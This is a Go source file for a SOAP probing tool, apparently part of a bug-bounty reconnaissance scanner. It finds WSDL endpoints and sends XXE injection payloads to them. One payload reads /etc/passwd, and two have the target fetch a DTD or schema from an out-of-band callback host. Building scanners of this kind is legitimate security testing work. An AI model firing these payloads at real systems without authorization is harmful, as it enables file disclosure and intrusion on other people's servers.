package tools

import (
	"context"
	"fmt"
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"

	"golang.org/x/time/rate"
)

type SOAPProbeTool struct{}

func (t *SOAPProbeTool) Name() string {
	return "soap_probe"
}

func (t *SOAPProbeTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 30
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	oobURL := scanCtx.InteractshOOBURL
	xxeDTDHost := "blind-xxe.invalid"
	if oobURL != "" {
		xxeDTDHost = strings.TrimPrefix(strings.TrimPrefix(oobURL, "https://"), "http://")
	}

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}
		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		parsed, err := url.Parse(target)
		if err != nil {
			return nil, nil
		}

		client := NewSafeHTTPClient(8 * time.Second)
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}

		var events []recon.Event

		soapPaths := []string{
			"/?wsdl",
			"/ws?wsdl",
			"/service.asmx?wsdl",
			"/api/soap?wsdl",
			"/WebService.asmx?wsdl",
			"/services?wsdl",
		}

		for _, sPath := range soapPaths {
			wsdlURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, sPath)
			wReq, err := http.NewRequestWithContext(ctx, "GET", wsdlURL, nil)
			if err != nil {
				continue
			}
			for k, v := range scanCtx.Headers {
				wReq.Header.Set(k, v)
			}

			wResp, err := client.Do(wReq)
			if err != nil {
				continue
			}
			bodyBytes, _ := io.ReadAll(io.LimitReader(wResp.Body, 512*1024))
			wResp.Body.Close()
			bodyStr := string(bodyBytes)

			if wResp.StatusCode != 200 {
				continue
			}
			if !strings.Contains(bodyStr, "wsdl:definitions") && !strings.Contains(bodyStr, "definitions>") {
				continue
			}

			events = append(events, recon.NewEvent(wsdlURL, t.Name(), "discovery", map[string]string{
				"type":   "soap_wsdl",
				"source": "soap_probe",
			}))

			postURL := strings.TrimSuffix(wsdlURL, "?wsdl")
			for _, variant := range t.buildXXEPayloads(xxeDTDHost) {
				req, err := http.NewRequestWithContext(ctx, "POST", postURL, strings.NewReader(variant.payload))
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "text/xml; charset=utf-8")
				req.Header.Set("SOAPAction", "\"\"")
				for k, v := range scanCtx.Headers {
					req.Header.Set(k, v)
				}

				reqDump, _ := httputil.DumpRequestOut(req, true)
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				pBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
				respDump, _ := httputil.DumpResponse(resp, false)
				resp.Body.Close()
				pStr := string(pBytes)

				errIndicators := []string{
					"failed to load external entity",
					"error parsing dtd",
					"could not connect",
					"connection refused",
					"no such host",
					"network is unreachable",
					"SAXParseException",
					"ExternalGeneralEntityFeature",
					"root:x:",
				}
				errDetected := false
				for _, ind := range errIndicators {
					if strings.Contains(strings.ToLower(pStr), strings.ToLower(ind)) {
						errDetected = true
						break
					}
				}

				oobDetected := oobURL != "" && strings.Contains(pStr, xxeDTDHost)

				if !errDetected && !oobDetected {
					continue
				}

				evidence := pStr
				if len(evidence) > 512 {
					evidence = evidence[:512] + "...(truncated)"
				}
				severity := "high"
				desc := fmt.Sprintf("SOAP endpoint at %s processed an XXE payload (variant: %s).", postURL, variant.name)
				if oobURL != "" {
					desc += fmt.Sprintf(" OOB DTD fetch attempted to %s — check interactsh for DNS/HTTP callback to confirm blind XXE.", xxeDTDHost)
					severity = "critical"
				}
				events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
					"vuln_name":   "XML External Entity (XXE) Injection",
					"severity":    severity,
					"url":         postURL,
					"variant":     variant.name,
					"oob_host":    xxeDTDHost,
					"evidence":    evidence,
					"description": desc,
					"request":     string(reqDump),
					"response":    string(respDump),
				}, severity))
				break
			}
		}

		return events, nil
	})
}

type xxeVariant struct {
	name    string
	payload string
}

func (t *SOAPProbeTool) buildXXEPayloads(dtdHost string) []xxeVariant {
	return []xxeVariant{
		{

			name: "oob_external_subset",
			payload: fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
  <!ENTITY %% dtd SYSTEM "http://%s/xxe.dtd">
  %%dtd;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>`, dtdHost),
		},
		{

			name: "error_based_file",
			payload: `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>`,
		},
		{

			name: "schema_location_oob",
			payload: fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://%s/schema.xsd">
  <soap:Body><test/></soap:Body>
</soap:Envelope>`, dtdHost),
		},
	}
}

var _ recon.Tool = (*SOAPProbeTool)(nil)
